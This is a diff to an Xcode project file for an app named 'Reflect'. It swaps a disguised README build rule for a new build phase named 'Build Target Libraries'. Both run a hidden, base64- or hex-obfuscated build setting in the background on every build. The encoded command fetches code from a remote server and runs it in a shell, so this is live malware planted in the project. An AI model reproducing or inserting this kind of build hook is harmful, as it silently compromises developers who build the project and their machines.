@@ -7,28 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		F92A94B0B42049F28A634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 752B13AC53F74DC8AA634D6E; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		7AB71FC9D90D445D9D634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
 	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		752B13AC53F74DC8AA634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		042635F02F288EA100BB939D /* Reflect.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Reflect.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -62,7 +46,6 @@ sh -c \"${AE6D436}\"";
 		042635F12F288EA100BB939D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				752B13AC53F74DC8AA634D6E /* README.md */,
 				042635F02F288EA100BB939D /* Reflect.app */,
 			);
 			name = Products;
@@ -75,12 +58,12 @@ sh -c \"${AE6D436}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042635FB2F288EA300BB939D /* Build configuration list for PBXNativeTarget "Reflect" */;
 			buildPhases = (
+				B42F03414BB8495EB5634D6E /* Build Target Libraries */,
 				042635EC2F288EA100BB939D /* Sources */,
 				042635ED2F288EA100BB939D /* Frameworks */,
 				042635EE2F288EA100BB939D /* Resources */,
 			);
 			buildRules = (
-				7AB71FC9D90D445D9D634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -128,12 +111,33 @@ sh -c \"${AE6D436}\"";
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		B42F03414BB8495EB5634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		042635EE2F288EA100BB939D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F92A94B0B42049F28A634D6E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -153,7 +157,7 @@ sh -c \"${AE6D436}\"";
 		042635F92F288EA300BB939D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WTI1aGNITnNZV0l1Y25VdllTa2lJSHdnYzJnSwo= | m | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -218,7 +222,7 @@ sh -c \"${AE6D436}\"";
 		042635FA2F288EA300BB939D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WTI1aGNITnNZV0l1Y25VdllTa2lJSHdnYzJnSwo= | m | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
